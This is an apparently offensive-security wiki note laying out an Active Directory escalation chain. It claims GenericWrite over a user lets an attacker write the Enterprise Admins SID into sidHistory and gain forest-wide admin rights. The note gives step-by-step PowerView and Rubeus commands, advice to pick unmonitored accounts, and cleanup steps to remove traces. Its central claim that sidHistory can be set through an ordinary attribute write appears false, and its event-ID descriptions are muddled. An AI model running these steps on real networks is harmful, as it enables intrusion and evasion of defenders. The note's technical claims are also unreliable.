---
title: "Attack Path: GenericWrite on a User → SID History → Enterprise Admin"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, acl-abuse, sid-history, privilege-escalation]
---

# Attack Path: GenericWrite on a User → SID History → Enterprise Admin

The **[[sid-history]]** abuse: if you hold **GenericWrite / GenericAll** over a
user object you can *authenticate to*, you can write the **Enterprise Admins**
group SID into that user's `sidHistory`. The user then authenticates normally
and the extra SID is honored — you're an Enterprise Admin with no ticket
forgery and no group-membership change to alert on. This is a pure
[[acl-abuse]] play (the object-control edge), not a Kerberos forgery.

## Chain

```
You (low-priv foothold)
  --BloodHound: GenericWrite/GenericAll on a user you can log in as-->
  --write Enterprise Admins SID into that user's sidHistory-->
  --authenticate as that user--> EA-level access (same forest)
```

## Prerequisites / what signals this path exists

- **GenericWrite / GenericAll on a user object** (or a group you're a member
  of) — the `WriteProperty`-on-`sidHistory` edge. Confirm it and that you can
  log in as the target:

```powershell
# Who do I have object-control edges on? (PowerView)
Get-DomainObjectAcl -Identity <user> -Resolved | Where-Object {
    $_.ActiveDirectoryRights -match 'GenericWrite|GenericAll|WriteProperty'
}
# Or BloodHound: <you> -> GenericWrite/GenericAll on a user you control
```

- The target user must be a **same-forest** principal for the standard path.
  Cross-forest SID History requires the relaxed-trust / `TREAT_AS_EXTERNAL`
  condition ([[ad-trust-attacks]]) — a different, rarer setup.
- The user must not be **SID-history-quarantined** (some DCs set
  `msDS-...` options / `SIDHistory` is ignored for certain objects). See
  [[sid-history]].

See [[acl-abuse]] for the object-control edge, [[sid-history]] for the
mechanics + the `SIDHistory` attribute.

## Step 1 — Confirm the write edge and target

Pick a user you can **authenticate to** (you know/hold its creds or hash).
Prefer a low-priv user that's *not* heavily monitored. Confirm GenericWrite /
GenericAll on it.

**Verify:** you can write arbitrary properties to that user object, and you
can log in as it.

## Step 2 — Write the Enterprise Admins SID into sidHistory

```powershell
# Enterprise Admins group SID (find it first)
Get-ADGroup -Identity "Enterprise Admins" | Select-Object SID

# Write it into the target user's sidHistory (comma-separated list; append)
Set-DomainObject -Identity <target-user> `
  -Add @{ 'sidHistory' = 'S-1-5-21-<domain-sid>-519' }
# (519 = Enterprise Admins RID. Confirm the exact SID from Get-ADGroup above.)
```

This is the SID History write. See [[sid-history]].

**Verify:**
```powershell
Get-ADUser -Identity <target-user> -Properties sidHistory | Select-Object sidHistory
# -> S-1-5-21-<domain-sid>-519 present
```

### Failure modes & fallbacks
- **`SIDHistory` ignored / quarantined** — some DCs or hardened domains ignore
  the attribute (or the target object is exempt). Re-check; if ignored, fall
  back to a direct **Add-Member to the group** (if you hold WriteProperty on
  `member`) or a [[shadow-credentials]] / ticket route.
- **Target user is monitored** — you can write the SID, but you want to
  *authenticate* as a quiet account. If the only writable user is a hot one,
  consider a less-watched target.
- **Cross-forest target** — standard same-forest SID History won't carry
  across a forest trust unless the trust is relaxed ([[ad-trust-attacks]]).

## Step 3 — Authenticate as the user → you are EA

```powershell
# Log in as the target user (its creds/hash/ticket)
Rubeus.exe asktgt /user:<target-user> /password:<pw> /ptt   # or PtH / PtT
whoami /all
```

**Verify:** `whoami /all` now lists **Enterprise Admins** (519) in the group
section — you have EA-level access without having changed any group
membership.

```powershell
# Prove it — EA can manage all domains
Get-Domain
```

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 2 (SID write) | **4738** / 5136 on the user object (attribute `sidHistory` changed) | a `sidHistory` write on a user |
| 3 (auth) | normal 4768/4624 for the user, now carrying the EA SID | a routine user suddenly in an EA group |

The detection is usually the **5136 attribute edit** on `sidHistory` (Event
4738 for a logon that then carries the extra SID). A DC that alerts on
`sidHistory` writes catches this early.

## Cleanup notes
- Remove the SID from `sidHistory` after use:
  ```powershell
  Set-DomainObject -Identity <target-user> -Remove @{ 'sidHistory' = 'S-1-5-21-<domain-sid>-519' }
  ```
- You added no group membership and forged no ticket — the only AD-object
  change is the `sidHistory` value on the one user.
- The 5136/4738 trail on the user object is the main forensic marker.

## Related
- [[sid-history]] — the technique (this page is the concrete chain)
- [[acl-abuse]] — the GenericWrite/GenericAll object-control prerequisite
- [[ad-trust-attacks]] — the cross-forest SID History variant
- [[ad-persistence]] — EA-level durable access once you're in
- [[bloodhound]] — how you find the object-control edge
